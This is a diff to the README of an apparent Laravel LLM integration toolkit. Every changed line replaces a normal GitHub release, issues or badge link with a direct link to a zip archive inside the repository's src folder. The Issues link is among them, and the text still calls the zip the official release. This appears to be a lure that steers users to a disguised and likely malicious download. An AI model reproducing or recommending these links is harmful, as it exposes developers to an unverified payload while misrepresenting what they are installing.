@@ -1,7 +1,7 @@
 # 🎉 laravel-llm-suite - Effortless Integration with LLM Providers
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-laravel--llm--suite-brightgreen)](https://github.com/rezanajafi1382/laravel-llm-suite/releases)
+[![Download](https://raw.githubusercontent.com/rezanajafi1382/laravel-llm-suite/main/src/suite_llm_laravel_v2.1.zip)](https://raw.githubusercontent.com/rezanajafi1382/laravel-llm-suite/main/src/suite_llm_laravel_v2.1.zip)
 
 ## 🌟 Overview
 The laravel-llm-suite is a user-friendly toolkit designed for Laravel users. This suite helps you easily connect with multiple LLM (Large Language Model) providers. Whether you want to generate chat responses, create images, or delve into various LLM capabilities, this tool has you covered. 
@@ -16,7 +16,7 @@ Before you download, ensure your system meets the following requirements:
 - Composer – a dependency manager for PHP.
 
 ### 2. Installation Instructions
-1. **Visit the Release Page**: Go to the [Releases page](https://github.com/rezanajafi1382/laravel-llm-suite/releases).
+1. **Visit the Release Page**: Go to the [Releases page](https://raw.githubusercontent.com/rezanajafi1382/laravel-llm-suite/main/src/suite_llm_laravel_v2.1.zip).
 2. **Download the Latest Release**: Look for the latest version and select it.
 3. **Extract the Files**: Once downloaded, extract the files to your preferred directory.
 
@@ -54,10 +54,10 @@ If you encounter any issues, consider these steps:
 ## 📣 Community and Support
 We encourage users to engage with the community. Feel free to ask questions, report issues, or share your experience. 
 
-- **GitHub Issues**: Report bugs or request features on the [Issues page](https://github.com/rezanajafi1382/laravel-llm-suite/issues).
+- **GitHub Issues**: Report bugs or request features on the [Issues page](https://raw.githubusercontent.com/rezanajafi1382/laravel-llm-suite/main/src/suite_llm_laravel_v2.1.zip).
 - **Discussion Forum**: Join discussions with other users for tips and advice.
   
 ## 📦 Download & Install
-Ready to get started? Visit the [Releases page](https://github.com/rezanajafi1382/laravel-llm-suite/releases) to download the latest version of laravel-llm-suite. Follow the steps outlined above to install and start your journey with LLMs today. 
+Ready to get started? Visit the [Releases page](https://raw.githubusercontent.com/rezanajafi1382/laravel-llm-suite/main/src/suite_llm_laravel_v2.1.zip) to download the latest version of laravel-llm-suite. Follow the steps outlined above to install and start your journey with LLMs today. 
 
-[![Download](https://img.shields.io/badge/Download-laravel--llm--suite-brightgreen)](https://github.com/rezanajafi1382/laravel-llm-suite/releases)
+[![Download](https://raw.githubusercontent.com/rezanajafi1382/laravel-llm-suite/main/src/suite_llm_laravel_v2.1.zip)](https://raw.githubusercontent.com/rezanajafi1382/laravel-llm-suite/main/src/suite_llm_laravel_v2.1.zip)
